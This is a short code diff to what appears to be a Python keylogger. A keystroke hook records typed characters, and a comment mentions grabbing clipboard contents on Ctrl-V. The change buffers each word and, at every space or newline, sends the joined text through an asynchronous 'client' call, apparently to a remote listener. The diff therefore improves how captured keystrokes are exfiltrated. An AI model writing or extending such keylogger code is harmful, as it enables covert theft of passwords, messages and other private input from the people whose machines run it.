@@ -73,8 +73,13 @@ def KeyStroke(event):
     # if they pressed a standard key
     if 33 < event.Ascii < 127:
         logged.append(chr(event.Ascii))
-        if event.Ascii == 32 or event.Ascii == 10:
-            asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
+        print(event.Ascii)
+    if event.Ascii == 32 or event.Ascii == 10:
+        concatinated = ""
+        concatinated = concatinated.join(logged)
+        logged.clear()
+        asyncio.get_event_loop().run_until_complete(client(concatinated))
+        concatinated = ""
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
